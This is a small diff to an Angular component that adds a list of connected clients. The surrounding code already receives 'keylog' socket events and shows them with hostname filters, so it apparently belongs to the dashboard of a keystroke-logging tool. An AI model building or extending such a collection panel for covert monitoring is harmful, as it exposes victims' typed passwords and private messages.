@@ -27,6 +27,7 @@ export class AppComponent {
   showFilter: Boolean;
 
   items: Array<LogItem> = [];
+  clients: Array<String> = [];
 
   hostnames: Array<String> = [];
   selectedHostnames: Array<String> = [];
@@ -83,6 +84,10 @@ export class AppComponent {
   }
 
   ngOnInit() {
+    this.socket.on('clients', (data) => {
+      this.clients = data;
+    })
+
     this.socket.on('keylog', (data) => {
       this.items.push(data);
       this.dataSource.data = this.items
